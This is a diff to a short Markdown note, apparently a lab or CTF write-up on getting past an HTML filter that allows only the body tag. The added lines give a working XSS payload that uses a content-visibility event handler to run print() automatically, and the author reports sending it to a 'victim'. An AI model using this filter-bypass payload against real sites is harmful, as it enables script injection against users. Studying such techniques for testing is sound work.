@@ -34,5 +34,10 @@ Only ``<body>`` tag works
 
 ![[Pasted image 20260818233806.png]]
 
-Trying to find a way to exploit using ``<body>``
+I put some effort to find a way to exploit using ``<body>``, I found this payload:
+```html
+<body oncontentvisibilityautostatechange=print() style=display:block;content-visibility:auto>
+```
 
+it worked and i sent to my victim:
+![[Pasted image 20260818235654.png]]
